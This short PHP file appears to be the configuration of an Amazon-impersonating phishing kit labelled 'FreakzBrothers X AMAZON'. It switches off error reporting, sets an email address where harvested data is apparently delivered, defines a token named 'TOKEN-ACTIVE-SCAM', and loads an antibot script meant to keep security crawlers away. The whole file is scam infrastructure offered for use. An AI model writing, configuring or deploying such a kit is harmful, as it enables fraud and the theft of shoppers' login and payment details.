<?php

/*
FreakzBrothers X AMAZON
*/

error_reporting(0);

$to             = 'admin@freakzbrothers.com';   // Edit Your Email
$token2         = 'TOKEN-ACTIVE-SCAM';   // Edit Your Token
$tembus_emel    = 'no'; // Tembus Email 

include (__DIR__) . 'anti/antibots.php';
